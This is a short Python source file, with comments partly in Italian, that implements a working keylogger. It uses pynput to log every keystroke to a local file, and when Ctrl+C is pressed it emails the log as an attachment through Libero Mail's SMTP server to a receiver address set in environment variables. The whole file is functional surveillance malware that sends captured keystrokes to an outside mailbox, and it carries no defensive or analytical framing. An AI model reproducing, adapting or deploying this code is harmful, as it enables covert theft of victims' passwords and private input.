import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from pynput.keyboard import Listener
import os
from dotenv import load_dotenv
load_dotenv()

log_dir = os.getcwd()
logging.basicConfig(filename=(log_dir + "/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Configurazione delle informazioni di accesso all'account Libero Mail
smtp_server = 'smtp.libero.it'
smtp_port = 465

## libero mail is needed
sender_email = os.getenv('sender_email')
sender_password = os.getenv('sender_password')
receiver_email = os.getenv('receiver_email')


def send_email(filename):
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = 'Keylog File'

    body = 'Attached is the keylog file.'
    message.attach(MIMEText(body, 'plain'))

    with open(filename, 'rb') as attachment:
        file_data = attachment.read()

    part = MIMEApplication(file_data)
    part.add_header('Content-Disposition', 'attachment', filename=filename)
    message.attach(part)

    try:
        server = smtplib.SMTP_SSL(smtp_server, smtp_port)
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        server.quit()
        print('Email sent successfully!')
    except Exception as e:
        print('An error occurred while sending the email:', str(e))


def on_press(key):
    logging.info(str(key))

    if str(key) == "'\\x03'":  # Ctrl+C per interrompere l'esecuzione e inviare l'email
        log_file = log_dir + "/keyLog.txt"
        send_email(log_file)
        quit()


with Listener(on_press=on_press) as listener:
    listener.join()
